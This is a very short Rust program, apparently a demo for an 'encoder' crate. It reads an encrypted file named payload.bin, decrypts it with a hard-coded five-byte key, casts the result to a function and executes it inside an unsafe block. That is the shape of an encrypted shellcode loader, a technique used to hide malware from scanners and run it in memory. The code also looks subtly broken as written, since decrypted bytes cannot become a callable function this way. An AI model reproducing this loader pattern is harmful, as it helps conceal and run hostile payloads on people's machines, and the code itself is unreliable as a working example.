use std::fs;

use encoder::encryption::Decrypt;

fn main() {
    unsafe {
        let bytes = fs::read("../payload.bin").unwrap();
        let decoded: fn() = bytes.decrypt(&[1,2,3,4,5]).unwrap();
        decoded();
        println!("shouldnt print anything");
    }
}
